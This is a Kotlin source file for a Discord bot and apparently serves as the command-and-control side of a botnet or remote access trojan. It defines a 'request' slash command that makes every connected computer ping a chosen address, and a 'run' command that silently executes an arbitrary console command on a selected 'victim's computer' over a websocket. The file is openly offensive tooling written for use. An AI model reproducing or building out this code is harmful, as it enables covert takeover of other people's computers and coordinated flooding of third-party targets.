package bot.commands

import bot.StatusChannel
import jdk.jshell.Snippet.Status
import me.jakejmattson.discordkt.arguments.AnyArg
import me.jakejmattson.discordkt.arguments.ChoiceArg
import me.jakejmattson.discordkt.commands.commands
import websocket.Application

fun remote() = commands("Remote Actions") {
    slash("request", "Every computers ping the given ip address/domain") {
        execute(AnyArg("address", "The address to ping")) {
            val address = args.first

            // TODO: Serialized Frame handling
            //  - proper instruction validation
            //  - typed s-object requests
            Application.sendAll("ping:$address")

        }
    }

    slash("run", "Silently run a console command on the victim's computer") {
        execute(AnyArg("command", "The command to run"), ChoiceArg("victim", "The online victim", *StatusChannel.status.filter { it.value }.keys.toTypedArray())) {
            val (command, victim) = args

            // TODO: Serialized Frame handling
            Application.send(victim, "run:$command")
        }
    }

}